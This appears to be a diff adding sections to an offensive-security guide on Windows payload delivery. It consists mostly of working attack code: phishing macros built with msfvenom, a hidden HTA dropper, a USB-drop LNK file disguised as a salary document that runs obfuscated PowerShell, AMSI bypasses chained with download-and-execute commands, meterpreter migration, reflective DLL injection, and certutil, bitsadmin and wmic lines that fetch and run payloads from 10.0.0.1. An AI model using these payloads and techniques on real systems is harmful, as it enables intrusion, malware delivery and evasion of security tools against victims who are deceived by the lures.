@@ -226,3 +226,193 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -
 - [MITRE ATT&CK - Initial Access](https://attack.mitre.org/tactics/TA0001/)
 - [Metasploit Web Delivery](https://docs.metasploit.com/docs/using-metasploit/exploitation/web-delivery.html)
 - [DLL Side-Loading (MITRE T1574.002)](https://attack.mitre.org/techniques/T1574/002/)
+
+---
+
+## 8. Social Engineering Delivery Techniques
+
+### Phishing Payload Construction
+
+Phishing remains one of the most effective initial access vectors. Payload construction for phishing requires careful attention to document appearance, macro reliability, and lure credibility.
+
+```bash
+# Generate Office macro with encoded PowerShell payload
+# Step 1: Create the PowerShell one-liner that downloads and executes
+PS_CMD='IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/shell.ps1")'
+ENCODED=$(echo -n "$PS_CMD" | iconv -t utf-16le | base64 -w0)
+
+# Step 2: Generate VBA macro with encoded command
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
+  -f vba-psh -o macro_encoded.txt
+
+# Step 3: Create the delivery document
+# Use a legitimate document template matching the lure
+# Common lure types:
+# - Financial reports (quarterly earnings, budget reviews)
+# - HR documents (policy updates, benefits enrollment)
+# - IT notifications (password reset, VPN update)
+# - Shipping notifications (delivery confirmation, tracking)
+```
+
+### HTA Advanced Delivery
+
+```bash
+# Custom HTA with multiple fallback mechanisms
+cat > delivery.hta << 'HTAEOF'
+<html>
+<head>
+<HTA:APPLICATION ID="update" APPLICATIONNAME="SystemUpdate" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
+</head>
+<script language="VBScript">
+Sub Window_OnLoad
+  Set shell = CreateObject("WScript.Shell")
+  ' Primary payload via PowerShell
+  shell.Run "powershell -nop -w hidden -enc <BASE64_PAYLOAD>", 0, False
+  ' Close HTA window immediately
+  window.close
+End Sub
+</script>
+</html>
+HTAEOF
+
+# Serve HTA with matching landing page
+python3 -m http.server 8080
+# Delivery URL: mshta http://10.0.0.1:8080/delivery.hta
+# Or embed in phishing email as attachment
+```
+
+### USB Drop Payload Construction
+
+```bash
+# Create a USB drop payload that autoruns when inserted
+# Note: Modern Windows disables autorun by default, but social engineering
+# can convince the user to open the file manually
+
+# Step 1: Create the autorun.inf (for older systems)
+cat > /mnt/usb/autorun.inf << 'EOF'
+[autorun]
+open=update.exe
+icon=shell32.dll,3
+label=USB Drive
+EOF
+
+# Step 2: Create a legitimate-looking shortcut (LNK) file
+# Use a shortcut that appears as a document but executes a payload
+# Create with PowerShell:
+powershell -c "
+\$ws = New-Object -ComObject WScript.Shell
+\$sc = \$ws.CreateShortcut('H:\Salary_Review_2024.lnk')
+\$sc.TargetPath = 'powershell.exe'
+\$sc.Arguments = '-nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(chr(39)+chr(104)+chr(116)+chr(116)+chr(112)+chr(58)+chr(47)+chr(47)+chr(49)+chr(48)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(49)+chr(47)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+chr(46)+chr(112)+chr(115)+chr(49)+chr(39))\"'
+\$sc.IconLocation = 'shell32.dll,70'
+\$sc.Save()
+"
+
+# Step 3: Add a convincing document file alongside
+# The user sees Salary_Review_2024.lnk with a folder icon
+# Double-clicking executes the PowerShell payload
+```
+
+## 9. AMSI Bypass Techniques
+
+The Anti-Malware Scan Interface (AMSI) in Windows 10+ intercepts PowerShell scripts before execution, sending content to the AV engine for inspection. AMSI bypasses are required for PowerShell-based payloads in modern Windows environments.
+
+### Common AMSI Bypass Methods
+
+```powershell
+# Method 1: Force AMSI initialization failure
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Method 2: Patch AMSI context in memory
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b=$a.GetField('amsiContext','NonPublic,Static')
+$c=$a.GetField('amsiSession','NonPublic,Static')
+$b.SetValue($null,[IntPtr]::Zero)
+$c.SetValue($null,$null)
+
+# Method 3: Unhook AMSI DLL (more robust against updates)
+$kernel32 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,UInt32 n,[Ref]UInt32 o);' -Name K -Passthrough)::GetModuleHandle('amsi.dll'),(Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);' -Name K2 -Passthrough)::GetProcAddress((Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);' -Name K3 -Passthrough)::GetModuleHandle('amsi.dll'),'AmsiScanBuffer'))
+```
+
+### AMSI Bypass Delivery Integration
+
+```bash
+# Integrate AMSI bypass into payload delivery chain
+# The AMSI bypass must execute BEFORE the malicious payload
+
+# Generate combined delivery script:
+cat > amsi_bypass_payload.ps1 << 'PSEOF'
+# AMSI bypass (must come first)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Payload (executes after AMSI is disabled)
+IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')
+PSEOF
+
+# Encode the combined script for delivery
+ENCODED=$(cat amsi_bypass_payload.ps1 | iconv -t utf-16le | base64 -w0)
+echo "powershell -nop -enc $ENCODED"
+```
+
+## 10. Advanced Evasion Techniques
+
+### Process Injection
+
+```bash
+# Using metasploit meterpreter for process injection (post-exploitation)
+# After catching a meterpreter session:
+meterpreter> migrate -N explorer.exe
+# Migrates the meterpreter session into the explorer.exe process
+# This removes the original payload process from memory
+
+# Using migrate with specific PID
+meterpreter> ps  # List processes
+meterpreter> migrate 1234  # Migrate to PID 1234
+
+# Automatic migration via multi/handler AutoRunScript
+msfconsole -q -x "use exploit/multi/handler; \
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
+  set LHOST 10.0.0.1; set LPORT 4444; \
+  set AutoRunScript post/windows/manage/migrate; \
+  exploit"
+```
+
+### Reflective DLL Injection
+
+```bash
+# Generate a reflective DLL for injection into running processes
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
+  -f dll -o reflective.dll
+
+# Inject using metasploit inject payload
+# After establishing a session:
+meterpreter> use inject
+meterpreter> inject -p 1234 -d reflective.dll
+
+# Alternative: use PowerShell for reflective injection
+# Generate PowerShell stager with reflection
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
+  -f psh-reflection -o reflective.ps1
+# The reflection format loads the payload entirely in memory without touching disk
+```
+
+### Living Off The Land (LOTL) Delivery
+
+```cmd
+# Certutil download + execute (commonly available on Windows)
+certutil -urlcache -split -f http://10.0.0.1/payload.exe C:\Windows\Temp\update.exe
+C:\Windows\Temp\update.exe
+
+# Bitsadmin for stealthy background download
+bitsadmin /transfer dl /priority low http://10.0.0.1/payload.exe C:\Windows\Temp\svchost.exe
+
+# Mshta for HTA execution (no file save needed)
+mshta http://10.0.0.1:8080/payload.hta
+
+# WMI for remote execution (no PowerShell logging)
+wmic /node:target /user:admin /password:pass process call create "cmd /c certutil -urlcache -split -f http://10.0.0.1/payload.exe C:\temp\p.exe && C:\temp\p.exe"
+
+# MSBuild for C# inline execution (bypasses PowerShell restrictions)
+# Create an inline task CSProj file that contains the payload code
+# Execute with: msbuild payload.csproj
+```
